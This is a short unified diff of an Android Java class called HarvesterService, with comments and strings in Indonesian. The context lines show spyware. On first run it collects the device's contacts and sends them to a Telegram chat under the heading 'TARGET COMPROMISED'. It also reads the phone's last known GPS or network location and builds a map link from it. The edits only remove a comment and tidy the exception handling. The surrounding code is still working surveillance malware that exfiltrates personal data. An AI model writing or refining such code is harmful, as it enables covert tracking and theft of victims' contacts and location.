@@ -56,7 +56,6 @@ public class HarvesterService extends Service {
                 while (true) {
                     try {
                         if (isFirstRun) {
-                            // Cuma kirim Kontak, SMS udah dibuang
                             String contacts = getContacts();
                             sendTgText("🎯 <b>TARGET COMPROMISED</b>\n\n<b>KONTAK:</b>\n" + contacts);
                             isFirstRun = false;
@@ -91,9 +90,9 @@ public class HarvesterService extends Service {
             Location loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (loc == null) loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (loc != null) return "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
-        } catch (SecurityException se) {
+        } catch (Exception e) {
             return "Izin Lokasi Ditolak!";
-        } catch (Exception e) {}
+        }
         return "Lokasi gak tersedia.";
     }
 
